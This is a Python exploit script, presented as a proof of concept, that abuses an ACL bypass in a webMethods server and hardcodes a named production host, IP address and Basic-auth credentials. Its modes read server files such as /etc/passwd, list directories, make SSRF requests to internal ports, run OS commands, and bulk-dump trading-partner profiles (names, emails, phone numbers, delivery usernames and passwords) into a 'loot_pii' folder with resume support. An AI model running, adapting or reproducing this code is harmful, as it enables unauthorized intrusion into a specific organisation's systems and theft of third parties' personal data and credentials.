#!/usr/bin/env python3
"""
webMethods ACL-bypass PoC — file read, dir list, SSRF, TN partner PII dump.

Sink: GWSoap.utils.misc:invokeWebService → nested Service.doInvoke
Target: b2b.att.com (144.160.219.83)
Auth: Central:manage  |  IDataBin helpers inlined

Usage:
  python3 wm_acl_poc.py --file /etc/hostname
  python3 wm_acl_poc.py --file /etc/./passwd -o passwd.txt
  python3 wm_acl_poc.py --list-dir /etc
  python3 wm_acl_poc.py --list-dir /tmp -o tmp_listing.txt
  python3 wm_acl_poc.py --url http://localhost:50090/
  python3 wm_acl_poc.py --url http://127.0.0.1:9995/invoke/wm.server:ping -o ping.html
  python3 wm_acl_poc.py --dump-pii
  python3 wm_acl_poc.py --dump-pii --pii-dir loot_pii --sleep 2
  python3 wm_acl_poc.py --cmd 'bash -c whoami'
  python3 wm_acl_poc.py --cmd 'bash -c id'
  python3 wm_acl_poc.py --cmd 'bash -c ifconfig'

Ctrl+C stops --dump-pii cleanly (progress kept on disk).
--cmd runs pub.utils:executeOSCommand (requires command on OSCommands allowlist).
"""
from __future__ import annotations

import argparse
import base64
import json
import os
import re
import signal
import socket
import ssl
import struct
import sys
import time
from typing import Any, Iterable

HOST = "b2b.att.com"
IP = "144.160.219.83"
AUTH = base64.b64encode(b"Central:manage").decode()
IV = "/invoke/GWSoap.utils.misc:invokeWebService"
_RS_HDR = bytes([0x0B, 0x04, 0x00, 0x00, 0x00, 0x01, 0x05, 0x01])
_ISMEM = "com.wm.data.ISMemDataImpl"

CTX = ssl.create_default_context()
CTX.check_hostname = False
CTX.verify_mode = ssl.CERT_NONE

_STOP = False
_SIGINT_COUNT = 0


def s1(s: str) -> bytes:
    """IDataBin UTF-16BE string (0x04 short / 0x84 long)."""
    enc = s.encode("utf-16-be")
    n = len(s)
    if n < 128:
        return bytes([0x04, n]) + enc
    return bytes([0x84]) + struct.pack(">I", n) + enc


def idb(pairs: Iterable[tuple[str, bytes]], trail: bool = False) -> bytes:
    """Build application/x-wmidatabin pipeline document."""
    b = _RS_HDR + s1(_ISMEM)
    for k, v in pairs:
        b += s1(k) + v
    if trail:
        b += bytes([0x02, 0x00])
    return b


def _on_sigint(signum, frame) -> None:  # noqa: ARG001
    global _STOP, _SIGINT_COUNT
    _SIGINT_COUNT += 1
    _STOP = True
    if _SIGINT_COUNT == 1:
        print(
            "\n[!] Ctrl+C — finishing current request then stopping… (Ctrl+C again to abort)",
            file=sys.stderr,
        )
    else:
        print("\n[!] second Ctrl+C — abort now", file=sys.stderr)
        raise SystemExit(130)


def log(msg: str, quiet: bool = False) -> None:
    if not quiet:
        print(msg, file=sys.stderr)


# ── wire ─────────────────────────────────────────────────────────────────────


def call_json(svc: str, fields: dict, timeout: float = 50) -> tuple[str, dict]:
    """Sink invoke; Accept JSON pipeline."""
    body = idb([("serviceName", s1(svc))] + [(k, s1(str(v))) for k, v in fields.items()])
    req = (
        f"POST {IV} HTTP/1.1\r\nHost: {HOST}\r\nAuthorization: Basic {AUTH}\r\n"
        f"Content-Type: application/x-wmidatabin\r\nAccept: application/json\r\n"
        f"Content-Length: {len(body)}\r\nConnection: close\r\n\r\n"
    ).encode() + body
    last_code = "ERR"
    for attempt in range(8):
        if _STOP:
            return last_code, {"_stopped": True}
        try:
            s = CTX.wrap_socket(socket.create_connection((IP, 443), 12), server_hostname=HOST)
            s.settimeout(timeout)
            s.sendall(req)
            r = b""
            while True:
                try:
                    x = s.recv(65536)
                    if not x:
                        break
                    r += x
                except Exception:
                    break
            s.close()
            last_code = r.split(b"\r\n", 1)[0].decode(errors="replace")
            bdy = r.partition(b"\r\n\r\n")[2]
            if b"not accepting" in bdy or "503" in last_code:
                time.sleep(2 + attempt * 0.5)
                continue
            if b"Request Rejected" in bdy:
                return last_code, {"_waf": True, "_raw": bdy.decode(errors="replace")}
            try:
                return last_code, json.loads(bdy)
            except Exception:
                return last_code, {"_raw_bytes": bdy[:500]}
        except Exception:
            time.sleep(2 + attempt * 0.5)
    return last_code, {}


def call_idb_raw(svc: str, fields: dict, timeout: float = 50) -> tuple[str, bytes]:
    """Sink invoke; Accept IDataBin (needed for SSRF body bytes)."""
    body = idb([("serviceName", s1(svc))] + [(k, s1(str(v))) for k, v in fields.items()])
    req = (
        f"POST {IV} HTTP/1.1\r\nHost: {HOST}\r\nAuthorization: Basic {AUTH}\r\n"
        f"Content-Type: application/x-wmidatabin\r\n"
        f"Accept: application/x-wmidatabin\r\n"
        f"Content-Length: {len(body)}\r\nConnection: close\r\n\r\n"
    ).encode() + body
    last_code = "ERR"
    for attempt in range(8):
        if _STOP:
            return last_code, b""
        try:
            s = CTX.wrap_socket(socket.create_connection((IP, 443), 12), server_hostname=HOST)
            s.settimeout(timeout)
            s.sendall(req)
            r = b""
            while True:
                try:
                    x = s.recv(65536)
                    if not x:
                        break
                    r += x
                except Exception:
                    break
            s.close()
            last_code = r.split(b"\r\n", 1)[0].decode(errors="replace")
            bdy = r.partition(b"\r\n\r\n")[2]
            if b"not accepting" in bdy or "503" in last_code:
                time.sleep(2 + attempt * 0.5)
                continue
            if b"Request Rejected" in bdy:
                return last_code, b""
            return last_code, bdy
        except Exception:
            time.sleep(2 + attempt * 0.5)
    return last_code, b""


def _pipeline_err(j: dict) -> str:
    ei = j.get("$errorInfo") or {}
    if isinstance(ei, dict):
        e = ei.get("$localizedError") or ei.get("$error") or ""
        if e:
            return e
    return j.get("$error") or ""


# ── file read ────────────────────────────────────────────────────────────────


def get_file(path: str, load_as: str = "string", timeout: float = 50) -> tuple[str, bytes | None, str]:
    code, j = call_json("pub.file:getFile", {"filename": path, "loadAs": load_as}, timeout=timeout)
    if not isinstance(j, dict):
        return code, None, "non-dict response"
    if j.get("_waf"):
        return code, None, "WAF rejected request (try a different path string)"
    err = _pipeline_err(j)
    body = j.get("body")
    if not isinstance(body, dict):
        return code, None, err or "no body in response"
    if load_as == "bytes":
        raw = body.get("bytes")
        if raw is None:
            return code, None, err or "no bytes field"
        if isinstance(raw, str):
            try:
                return code, base64.b64decode(raw), err
            except Exception:
                return code, raw.encode("utf-8", errors="replace"), err
        return code, bytes(raw), err
    s = body.get("string")
    if s is None:
        return code, None, err or "no string field"
    return code, s.encode("utf-8", errors="replace"), err


def cmd_file(args: argparse.Namespace) -> int:
    code, data, err = get_file(args.file, load_as=args.load_as, timeout=args.timeout)
    if data is None and not err and args.load_as == "string":
        code, data, err = get_file(args.file, load_as="bytes", timeout=args.timeout)

    if data is None:
        log(f"[!] FAIL {code}", args.quiet)
        if err:
            log(f"[!] {err}", args.quiet)
        return 1

    log(f"[+] {code}  {args.file}  ({len(data)} bytes)", args.quiet)
    if args.out:
        with open(args.out, "wb") as f:
            f.write(data)
        log(f"[+] wrote {args.out}", args.quiet)
    else:
        sys.stdout.buffer.write(data)
        if not data.endswith(b"\n"):
            sys.stdout.buffer.write(b"\n")
    return 0


# ── directory list ────────────────────────────────────────────────────────────


def list_dir(directory: str, timeout: float = 50) -> tuple[str, list[str] | None, str | None]:
    """att_utils.file:listFiles via sink; returns (http_code, entries|None, err)."""
    code, j = call_json(
        "att_utils.file:listFiles",
        {"directory": directory},
        timeout=timeout,
    )
    if j.get("_waf"):
        return code, None, "WAF"
    if j.get("_stopped"):
        return code, None, "stopped"
    err = (j.get("$errorInfo") or {}).get("$localizedError") or j.get("$error")
    entries = j.get("file_list") or j.get("fileList")
    if entries is None and not err:
        return code, None, "no file_list in response"
    if err and not entries:
        return code, None, str(err)
    if not isinstance(entries, list):
        entries = [str(entries)]
    return code, [str(x) for x in entries], None


def cmd_list_dir(args: argparse.Namespace) -> int:
    code, entries, err = list_dir(args.list_dir, timeout=args.timeout)
    if entries is None:
        log(f"[!] FAIL {code}", args.quiet)
        if err:
            log(f"[!] {err}", args.quiet)
        return 1

    text = "\n".join(entries) + ("\n" if entries else "")
    log(f"[+] {code}  {args.list_dir}  ({len(entries)} entries)", args.quiet)
    if args.out:
        with open(args.out, "w", encoding="utf-8") as f:
            f.write(text)
        log(f"[+] wrote {args.out}", args.quiet)
    else:
        sys.stdout.write(text)
    return 0


# ── OS command ────────────────────────────────────────────────────────────────


def exec_os_command(command: str, timeout: float = 50) -> tuple[str, dict]:
    """pub.utils:executeOSCommand via sink."""
    return call_json("pub.utils:executeOSCommand", {"command": command}, timeout=timeout)


def cmd_os(args: argparse.Namespace) -> int:
    code, j = exec_os_command(args.cmd, timeout=args.timeout)
    if j.get("_waf"):
        log(f"[!] WAF {code}", args.quiet)
        return 1
    if j.get("_stopped"):
        return 130
    err = (j.get("$errorInfo") or {}).get("$localizedError") or j.get("$error")
    out = j.get("outputMessage")
    if out is None:
        out = j.get("output")
    status = j.get("status")
    if err and (out is None or out == ""):
        log(f"[!] FAIL {code}", args.quiet)
        log(f"[!] {err}", args.quiet)
        return 1
    text = "" if out is None else str(out)
    if text and not text.endswith("\n"):
        text += "\n"
    log(f"[+] {code}  cmd={args.cmd!r}  status={status}", args.quiet)
    if err:
        log(f"[!] {err}", args.quiet)
    if args.out:
        with open(args.out, "w", encoding="utf-8") as f:
            f.write(text)
        log(f"[+] wrote {args.out}", args.quiet)
    else:
        sys.stdout.write(text)
    return 0


# ── SSRF ─────────────────────────────────────────────────────────────────────


def _read_s1(data: bytes, i: int) -> tuple[str | None, int]:
    if i >= len(data):
        return None, i
    t = data[i]
    if t == 0x04 and i + 2 <= len(data):
        n = data[i + 1]
        start, end = i + 2, i + 2 + 2 * n
        if end <= len(data):
            return data[start:end].decode("utf-16-be", errors="replace"), end
    if t == 0x84 and i + 5 <= len(data):
        n = struct.unpack(">I", data[i + 1 : i + 5])[0]
        start, end = i + 5, i + 5 + 2 * n
        if 0 <= n < 2_000_000 and end <= len(data):
            return data[start:end].decode("utf-16-be", errors="replace"), end
    return None, i


def extract_ssrf_headers(data: bytes) -> tuple[str | None, str | None, dict[str, str]]:
    status = status_msg = None
    lines: dict[str, str] = {}
    interesting = {
        "Content-Type",
        "Content-Length",
        "Set-Cookie",
        "Server",
        "Location",
        "WWW-Authenticate",
        "Transfer-Encoding",
        "Content-Security-Policy",
        "X-FRAME-OPTIONS",
        "Cache-Control",
        "Expires",
        "Content-Language",
        "Pragma",
        "Vary",
        "X-UA-COMPATIBLE",
    }
    keys_vals: list[str] = []
    i = 0
    while i < len(data) - 2:
        s, ni = _read_s1(data, i)
        if s is None:
            i += 1
            continue
        keys_vals.append(s)
        i = ni
    header_names = interesting | {"status", "statusMessage"}
    for a, b in zip(keys_vals, keys_vals[1:]):
        if a == "status" and b.isdigit():
            status = b
        elif a == "statusMessage" and b not in header_names:
            status_msg = b
        elif a in interesting and b not in header_names:
            lines[a] = b
    return status, status_msg, lines


def extract_ssrf_body(data: bytes) -> tuple[bytes | None, str]:
    needle = b"\x00b\x00o\x00d\x00y"
    idx = 0
    while True:
        j = data.find(needle, idx)
        if j < 0:
            break
        p = j + len(needle)
        if data[p : p + 2] == b"\x05\x01":
            for off in range(0, 20):
                if p + off >= len(data):
                    break
                t = data[p + off]
                if t == 0x83 and p + off + 5 <= len(data):
                    n = struct.unpack(">I", data[p + off + 1 : p + off + 5])[0]
                    start = p + off + 5
                    if 0 < n < 5_000_000 and start + n <= len(data):
                        return data[start : start + n], f"0x83 len={n}"
                if t == 0x03 and p + off + 2 <= len(data):
                    n = data[p + off + 1]
                    start = p + off + 2
                    if start + n <= len(data):
                        return data[start : start + n], f"0x03 len={n}"
        idx = j + 1
    best: bytes | None = None
    meta = ""
    i = 0
    while i < len(data) - 5:
        if data[i] == 0x83:
            n = struct.unpack(">I", data[i + 1 : i + 5])[0]
            if 0 < n < 5_000_000 and i + 5 + n <= len(data):
                chunk = data[i + 5 : i + 5 + n]
                if best is None or len(chunk) > len(best):
                    best, meta = chunk, f"0x83-scan len={n}"
                i = i + 5 + n
                continue
        i += 1
    if best is not None:
        return best, meta
    return None, "body byte array not found"


def http_fetch(
    url: str, method: str = "GET", timeout: float = 50
) -> tuple[str, dict, bytes | None, str]:
    fields = {"url": url, "method": method.upper(), "loadAs": "bytes"}
    code, raw = call_idb_raw("pub.client:http", fields, timeout=timeout)
    if not raw:
        return code, {}, None, "empty response (WAF/503/error)"
    if raw[:1] != b"\x0b" and b"Request Rejected" in raw:
        return code, {}, None, "WAF rejected request"
    status, status_msg, headers = extract_ssrf_headers(raw)
    body, how = extract_ssrf_body(raw)
    meta = {
        "status": status,
        "statusMessage": status_msg,
        "headers": headers,
        "extract": how,
        "idb_len": len(raw),
    }
    if body is None:
        return code, meta, None, how
    return code, meta, body, ""


def cmd_ssrf(args: argparse.Namespace) -> int:
    log(f"[*] sink  {IV} → pub.client:http", args.quiet)
    log(f"[*] fetch {args.method.upper()} {args.url}", args.quiet)
    code, meta, data, err = http_fetch(args.url, method=args.method, timeout=args.timeout)
    log(f"[*] edge  {code}", args.quiet)
    if meta.get("idb_len"):
        log(f"[*] idb   {meta['idb_len']} bytes", args.quiet)
    st, sm = meta.get("status"), meta.get("statusMessage")
    if st is not None:
        log(f"[+] remote HTTP: {st} {sm or ''}".rstrip(), args.quiet)
    hdrs = meta.get("headers") or {}
    if hdrs and not args.quiet:
        log("[+] response headers:", args.quiet)
        for k, v in hdrs.items():
            log(f"    {k}: {v}", args.quiet)
    if data is None:
        log("[!] FAIL — no body content", args.quiet)
        if err:
            log(f"[!] {err}", args.quiet)
        return 1
    log(f"[+] body   {len(data)} bytes  ({meta.get('extract')})", args.quiet)
    if args.out:
        with open(args.out, "wb") as f:
            f.write(data)
        log(f"[+] wrote  {args.out}", args.quiet)
    else:
        sys.stdout.buffer.write(data)
        if not data.endswith(b"\n"):
            sys.stdout.buffer.write(b"\n")
    return 0


# ── PII dump ─────────────────────────────────────────────────────────────────


def _safe_name(s: str) -> str:
    s = re.sub(r"[^\w.\-]+", "_", s.strip())[:80]
    return s or "unknown"


def _extract_pii_summary(profile: dict) -> dict[str, Any]:
    """Compact row for ndjson index (contacts / delivery / ids)."""
    corp = profile.get("Corporate") or {}
    contacts = []
    for c in profile.get("Contact") or []:
        if not isinstance(c, dict):
            continue
        contacts.append(
            {
                "GivenName": c.get("GivenName"),
                "Surname": c.get("Surname"),
                "EmailAddress": c.get("EmailAddress"),
                "TelNumber": c.get("TelNumber"),
                "FaxNumber": c.get("FaxNumber"),
            }
        )
    deliveries = []
    for d in profile.get("Delivery") or []:
        if not isinstance(d, dict):
            continue
        deliveries.append(
            {
                "Protocol": d.get("Protocol"),
                "Host": d.get("Host"),
                "Port": d.get("Port"),
                "Location": d.get("Location"),
                "UserName": d.get("UserName"),
                "Password": d.get("Password"),
            }
        )
    return {
        "PartnerID": corp.get("PartnerID"),
        "CorporationName": corp.get("CorporationName"),
        "OrgUnitName": corp.get("OrgUnitName"),
        "Status": corp.get("Status"),
        "Address": corp.get("Address"),
        "Contacts": contacts,
        "Delivery": deliveries,
        "ID": profile.get("ID"),
    }


def _fmt_addr(addr: Any) -> str:
    if isinstance(addr, list):
        parts = [_fmt_addr(a) for a in addr if a]
        return " | ".join(p for p in parts if p)
    if not isinstance(addr, dict):
        return ""
    bits = [
        addr.get("AddressLine1"),
        addr.get("AddressLine2"),
        addr.get("City"),
        addr.get("State_Province"),
        addr.get("Zip_PostalCode"),
        addr.get("Country"),
    ]
    return ", ".join(str(b) for b in bits if b)


def print_pii(profile: dict, quiet: bool = False) -> None:
    """Print human-readable PII for one profile to stderr."""
    if quiet:
        return
    row = _extract_pii_summary(profile)
    corp_name = row.get("CorporationName") or "?"
    status = row.get("Status") or "?"
    log(f"    corp     {corp_name}  [{status}]", False)
    org = row.get("OrgUnitName")
    if org and org != corp_name:
        log(f"    org      {org}", False)
    addr = _fmt_addr(row.get("Address"))
    if addr:
        log(f"    address  {addr}", False)
    contacts = row.get("Contacts") or []
    if not contacts:
        log("    contacts (none)", False)
    for i, c in enumerate(contacts, 1):
        name = " ".join(
            str(x) for x in (c.get("GivenName"), c.get("Surname")) if x
        ).strip() or "(no name)"
        email = c.get("EmailAddress") or "-"
        tel = c.get("TelNumber") or "-"
        fax = c.get("FaxNumber")
        line = f"    contact{i} {name}  email={email}  tel={tel}"
        if fax:
            line += f"  fax={fax}"
        log(line, False)
    for i, d in enumerate(row.get("Delivery") or [], 1):
        host = d.get("Host") or "-"
        port = d.get("Port") or ""
        proto = d.get("Protocol") or "-"
        loc = d.get("Location") or ""
        user = d.get("UserName")
        hp = f"{host}:{port}" if port else str(host)
        log(f"    deliver{i} {proto}://{hp}{loc}", False)
        if user:
            log(f"             user={user}  pass={d.get('Password')!r}", False)
    for i, xid in enumerate(row.get("ID") or [], 1):
        if isinstance(xid, dict) and xid.get("ExternalID"):
            log(f"    extid{i}   {xid.get('ExternalID')}  (type={xid.get('IDType')})", False)


def cmd_dump_pii(args: argparse.Namespace) -> int:
    signal.signal(signal.SIGINT, _on_sigint)
    out_dir = args.pii_dir
    os.makedirs(out_dir, exist_ok=True)
    profiles_dir = os.path.join(out_dir, "profiles")
    os.makedirs(profiles_dir, exist_ok=True)
    index_path = os.path.join(out_dir, "pii_index.ndjson")
    summaries_path = os.path.join(out_dir, "summaries.json")
    done_path = os.path.join(out_dir, "done_ids.txt")

    done: set[str] = set()
    if os.path.isfile(done_path) and not args.fresh:
        done = {ln.strip() for ln in open(done_path) if ln.strip()}
        log(f"[*] resume: {len(done)} already dumped", False)

    log(f"[*] sink  {IV}", False)
    log(f"[*] fetch wm.tn.profile:getProfileSummaries → {out_dir}", False)
    code, j = call_json("wm.tn.profile:getProfileSummaries", {}, timeout=args.timeout)
    if not isinstance(j, dict) or j.get("_waf") or _pipeline_err(j):
        log(f"[!] FAIL summaries {code} {_pipeline_err(j) or j}", False)
        return 1
    profiles = j.get("profiles") or []
    if not isinstance(profiles, list):
        log("[!] no profiles list", False)
        return 1
    with open(summaries_path, "w") as f:
        json.dump(profiles, f, indent=2, default=str)
    log(f"[+] {len(profiles)} profile summaries ({code})", False)

    # host profile once
    if not _STOP and (args.fresh or not os.path.isfile(os.path.join(out_dir, "host_profile.json"))):
        time.sleep(args.sleep)
        log("[*] wm.tn.profile:getHostProfile", False)
        hc, hj = call_json("wm.tn.profile:getHostProfile", {}, timeout=args.timeout)
        if isinstance(hj, dict) and hj.get("profile"):
            with open(os.path.join(out_dir, "host_profile.json"), "w") as f:
                json.dump(hj["profile"], f, indent=2, default=str)
            log("[+] wrote host_profile.json", False)
            print_pii(hj["profile"])
        else:
            log(f"[!] host profile: {hc} {_pipeline_err(hj) if isinstance(hj, dict) else hj}", False)

    n_ok = n_fail = n_skip = 0
    with open(index_path, "a") as index_f, open(done_path, "a") as done_f:
        for i, summ in enumerate(profiles, 1):
            if _STOP:
                break
            if not isinstance(summ, dict):
                continue
            pid = summ.get("ProfileID") or summ.get("partnerID") or ""
            if not pid:
                n_skip += 1
                continue
            if pid in done:
                n_skip += 1
                continue

            name = summ.get("CorporationName") or pid
            log(f"[*] [{i}/{len(profiles)}] {name}  ({pid})", False)
            time.sleep(args.sleep)
            if _STOP:
                break

            code, j = call_json(
                "wm.tn.profile:getProfile",
                {"partnerID": pid},
                timeout=args.timeout,
            )
            err = _pipeline_err(j) if isinstance(j, dict) else "bad response"
            prof = j.get("profile") if isinstance(j, dict) else None
            if not isinstance(prof, dict) or err:
                n_fail += 1
                log(f"[!] fail {code} {err[:160]}", False)
                # still mark done so we don't hammer the same id forever
                if args.skip_fail:
                    done.add(pid)
                    done_f.write(pid + "\n")
                    done_f.flush()
                continue

            fname = f"{_safe_name(str(name))}__{pid}.json"
            fpath = os.path.join(profiles_dir, fname)
            with open(fpath, "w") as f:
                json.dump(
                    {"summary": summ, "profile": prof, "edge": code},
                    f,
                    indent=2,
                    default=str,
                )
            row = _extract_pii_summary(prof)
            row["_file"] = fname
            row["_summaryStatus"] = summ.get("Status")
            index_f.write(json.dumps(row, default=str) + "\n")
            index_f.flush()
            done.add(pid)
            done_f.write(pid + "\n")
            done_f.flush()
            n_ok += 1
            n_contacts = len(row.get("Contacts") or [])
            log(f"[+] ok  contacts={n_contacts} → {fname}", False)
            print_pii(prof)

    log(
        f"[*] done  ok={n_ok} fail={n_fail} skip={n_skip}  "
        f"stopped={'yes' if _STOP else 'no'}  dir={out_dir}",
        False,
    )
    return 0 if n_ok or n_skip else 1


# ── CLI ──────────────────────────────────────────────────────────────────────


def main() -> int:
    global HOST, IP, AUTH

    ap = argparse.ArgumentParser(
        description="ACL-bypass PoC: file read / dir list / SSRF / TN PII / OS cmd",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="Pick exactly one of: --file | --list-dir | --url | --dump-pii | --cmd",
    )
    mode = ap.add_mutually_exclusive_group(required=True)
    mode.add_argument("--file", "-f", help="Remote path for pub.file:getFile")
    mode.add_argument(
        "--list-dir",
        metavar="DIR",
        help="Remote directory for att_utils.file:listFiles (e.g. /etc, /tmp, config)",
    )
    mode.add_argument("--url", "-u", help="URL for pub.client:http SSRF")
    mode.add_argument(
        "--dump-pii",
        action="store_true",
        help="Dump TN partner profiles (getProfileSummaries → getProfile) until Ctrl+C",
    )
    mode.add_argument(
        "--cmd",
        metavar="COMMAND",
        help="OS command for pub.utils:executeOSCommand (e.g. 'bash -c whoami')",
    )

    ap.add_argument("--out", "-o", help="Write file/SSRF/list body to local path")
    ap.add_argument("--quiet", "-q", action="store_true", help="Less stderr (file/ssrf/list)")
    ap.add_argument("--timeout", type=float, default=50.0)
    ap.add_argument("--host", default=HOST, help=f"Host header / SNI (default {HOST})")
    ap.add_argument("--ip", default=IP, help=f"Connect IP (default {IP})")

    # file
    ap.add_argument("--load-as", choices=("string", "bytes"), default="string")

    # ssrf
    ap.add_argument("--method", "-X", default="GET", help="SSRF HTTP method (default GET)")

    # pii
    ap.add_argument(
        "--pii-dir",
        default="loot_pii",
        help="Output directory for --dump-pii (default: loot_pii)",
    )
    ap.add_argument(
        "--sleep",
        type=float,
        default=2.0,
        help="Seconds between PII profile fetches (default: 2)",
    )
    ap.add_argument(
        "--fresh",
        action="store_true",
        help="Ignore done_ids.txt resume state",
    )
    ap.add_argument(
        "--skip-fail",
        action="store_true",
        help="Record failed ProfileIDs as done (do not retry on resume)",
    )

    args = ap.parse_args()
    HOST = args.host
    IP = args.ip

    if args.file:
        return cmd_file(args)
    if args.list_dir:
        return cmd_list_dir(args)
    if args.url:
        return cmd_ssrf(args)
    if args.cmd:
        return cmd_os(args)
    return cmd_dump_pii(args)


if __name__ == "__main__":
    sys.exit(main())
